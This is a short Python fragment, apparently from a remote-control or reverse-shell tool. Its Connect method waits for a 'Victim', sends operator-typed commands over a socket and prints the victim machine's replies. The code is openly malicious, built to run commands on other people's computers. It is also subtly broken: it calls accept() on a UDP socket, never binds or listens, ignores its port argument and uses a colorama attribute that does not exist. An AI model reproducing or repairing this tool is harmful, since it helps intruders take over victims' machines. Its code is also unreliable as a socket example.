import socket
from colorama import Fore
def Connect(self , Victim_port):
        Connection = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
        try:
            Victim, Address = Connection.accept()
            Connected = True
            while Connected :
                self.Command = str(
                    input("[" + Fore.LIGHTYELLOW_EX+ '*' +  "] {Victim} ..> ".format(Victim = Address)))
                Connection.send(self.Command.encode("UTF-8"))
                print(Connection.recv(1024).decode("UTF-8"))
        except :
            Connected = False
            print("[" + Fore.LIGHTRED + '-' + Fore.RESET + "] Connection Failed . Victim Might Be Offline Try Again Later")
            return False